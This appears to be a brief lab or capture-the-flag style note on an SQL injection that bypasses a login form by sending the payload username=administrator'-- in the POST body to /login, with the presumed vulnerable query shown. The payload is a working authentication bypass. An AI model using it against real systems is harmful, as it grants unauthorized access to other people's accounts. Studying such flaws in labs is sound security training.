# SQL injection vulnerability allowing login bypass

SQLi in the ‘username’ body parameter of the POST request to /login.

```http
username=administrator’--
```

The query is likely:

```sql
SELECT * FROM users WHERE username='administrator'--' AND password='password';
```
